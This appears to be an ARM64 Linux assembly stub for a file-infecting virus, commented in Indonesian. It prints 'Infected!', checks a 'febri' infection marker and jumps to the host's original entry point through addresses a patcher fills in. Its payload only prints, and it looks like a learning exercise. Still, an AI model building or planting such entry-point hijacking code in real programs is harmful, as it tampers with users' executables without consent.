.section .text
.global _start
_start:
    // tulis "Infected!\n"
    mov x0, #1                  // stdout
    ldr x1, =msg
    mov x2, #9
    mov x8, #64                 // syscall write
    svc #0

    // cek signature (alamat akan dipatch)
    ldr x3, =signature_addr     // akan di-patch ke alamat signature
    ldrb w4, [x3]
    ldrb w5, [x3, #1]
    ldrb w6, [x3, #2]
    ldrb w7, [x3, #3]
    ldrb w8, [x3, #4]

    cmp w4, #'f'
    b.ne skip
    cmp w5, #'e'
    b.ne skip
    cmp w6, #'b'
    b.ne skip
    cmp w7, #'r'
    b.ne skip
    cmp w8, #'i'
    b.ne skip

    // signature cocok → lompat ke original entry point
    ldr x9, =original_entry     // akan di-patch
    br x9

skip:
    // exit
    mov x0, #0
    mov x8, #93
    svc #0

msg: .ascii "Infected!\n"

// Placeholder untuk patcher
signature_addr: .dword 0xAAAAAAAAAAAAAAAA
original_entry: .dword 0xBBBBBBBBBBBBBBBB
